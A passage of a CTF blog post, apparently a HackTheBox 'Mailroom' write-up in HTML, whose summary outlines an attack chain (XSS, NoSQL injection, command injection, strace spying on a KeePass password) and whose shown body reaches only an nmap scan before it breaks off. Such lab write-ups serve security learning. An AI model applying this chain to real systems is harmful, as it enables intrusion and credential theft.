@@ -1,0 +1,1760 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Mailroom is a hard difficulty box with a contact form vulnerable to XSS as well as a publicly accessible gitea repository for a private web server on the box. Using XSS combined with XMLHttpRequest, we can make our xss victim access the private web page on our behalf.  By reviewing the source code, we can identify a NoSQL injection vulnerability that allows us to leak login credentials for a user. The login credentials are re-used as login credentials to the Mailroom machine, allowing us to view the page now through port forwarding. The private website also contains a command injection vulnerability, which allows us to explore the docker container it operates. We find more user credentials enumerating the gitea config, and we see this user possesses a keepass vault that is frequently being accessed. Using strace, we can spy on the inputs being supplied and retrieve the vault password. The vault contains credentials for the box&#39;s root user.'><title>HackTheBox - Mailroom</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-mailroom/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Mailroom'>
+<meta property='og:description' content='Mailroom is a hard difficulty box with a contact form vulnerable to XSS as well as a publicly accessible gitea repository for a private web server on the box. Using XSS combined with XMLHttpRequest, we can make our xss victim access the private web page on our behalf.  By reviewing the source code, we can identify a NoSQL injection vulnerability that allows us to leak login credentials for a user. The login credentials are re-used as login credentials to the Mailroom machine, allowing us to view the page now through port forwarding. The private website also contains a command injection vulnerability, which allows us to explore the docker container it operates. We find more user credentials enumerating the gitea config, and we see this user possesses a keepass vault that is frequently being accessed. Using strace, we can spy on the inputs being supplied and retrieve the vault password. The vault contains credentials for the box&#39;s root user.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-mailroom/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Gitea' /><meta property='article:tag' content='Keepass' /><meta property='article:tag' content='Command Injection' /><meta property='article:tag' content='XSS' /><meta property='article:tag' content='NoSQL Injection' /><meta property='article:tag' content='strace' /><meta property='article:published_time' content='2023-08-19T22:25:45-05:00'/><meta property='article:modified_time' content='2023-08-19T22:25:45-05:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-mailroom/Mailroom.png' />
+<meta name="twitter:title" content="HackTheBox - Mailroom">
+<meta name="twitter:description" content="Mailroom is a hard difficulty box with a contact form vulnerable to XSS as well as a publicly accessible gitea repository for a private web server on the box. Using XSS combined with XMLHttpRequest, we can make our xss victim access the private web page on our behalf.  By reviewing the source code, we can identify a NoSQL injection vulnerability that allows us to leak login credentials for a user. The login credentials are re-used as login credentials to the Mailroom machine, allowing us to view the page now through port forwarding. The private website also contains a command injection vulnerability, which allows us to explore the docker container it operates. We find more user credentials enumerating the gitea config, and we see this user possesses a keepass vault that is frequently being accessed. Using strace, we can spy on the inputs being supplied and retrieve the vault password. The vault contains credentials for the box&#39;s root user."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-mailroom/Mailroom.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">CTF Adventures</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-mailroom/">
+                <img src="/post/hackthebox-mailroom/Mailroom_hu83fa4872cdc769af1a6c4264f0edd42d_354362_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-mailroom/Mailroom_hu83fa4872cdc769af1a6c4264f0edd42d_354362_800x0_resize_box_3.png 800w, /post/hackthebox-mailroom/Mailroom_hu83fa4872cdc769af1a6c4264f0edd42d_354362_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Mailroom" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack The Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-mailroom/">HackTheBox - Mailroom</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Mailroom is a hard difficulty box with a contact form vulnerable to XSS as well as a publicly accessible gitea repository for a private web server on the box. Using XSS combined with XMLHttpRequest, we can make our xss victim access the private web page on our behalf.  By reviewing the source code, we can identify a NoSQL injection vulnerability that allows us to leak login credentials for a user. The login credentials are re-used as login credentials to the Mailroom machine, allowing us to view the page now through port forwarding. The private website also contains a command injection vulnerability, which allows us to explore the docker container it operates. We find more user credentials enumerating the gitea config, and we see this user possesses a keepass vault that is frequently being accessed. Using strace, we can spy on the inputs being supplied and retrieve the vault password. The vault contains credentials for the box&#39;s root user.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 19, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Nmap 7.93 scan initiated Sun Apr 16 09:30:53 2023 as: nmap -sCV -p 22,80 -oN nmap_scriptports.txt 10.129.208.171
+</span></span><span class="line"><span class="cl">Nmap scan report for 10.129.208.171
+</span></span><span class="line"><span class="cl">Host is up (0.017s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
+</span></span><span class="line"><span class="cl">|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.54 ((Debian))
+</span></span><span class="line"><span class="cl">|_http-title: The Mail Room
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.54 (Debian)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
